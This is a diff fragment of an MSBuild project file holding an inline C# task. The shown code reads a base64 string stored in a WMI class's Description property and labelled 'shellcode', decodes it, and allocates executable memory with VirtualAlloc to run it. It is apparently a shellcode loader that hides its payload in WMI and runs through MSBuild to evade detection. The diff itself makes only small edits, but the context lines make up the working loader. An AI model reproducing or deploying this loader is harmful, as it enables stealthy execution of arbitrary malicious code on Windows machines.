@@ -95,11 +95,11 @@
                         Console.WriteLine("test");
   
   ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM meta_class WHERE __class = 'Win32_OSRecoveryConfigurationData'");
-            ManagementObjectCollection myDiskCollection = searcher.Get();
+           ManagementObjectCollection myDiskCollection = searcher.Get();
 
             string result = string.Empty;
 
-            foreach (ManagementBaseObject pe in myDiskCollection)
+           foreach (ManagementBaseObject pe in myDiskCollection)
             {
                 Console.WriteLine(pe.GetPropertyValue("Description"));
                  string shellcode = pe.GetPropertyValue("Description").ToString();
@@ -108,8 +108,7 @@
             }
 
 
-            byte[] shell = Convert.FromBase64String(result);
-         
+            byte[] shell = Convert.FromBase64String(result.ToString());			
 
                 UInt32 funcAddr = VirtualAlloc(0, (UInt32)shell.Length,
             MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -131,6 +130,5 @@
     </Task>
     </UsingTask>
 </Project>
-
 
 
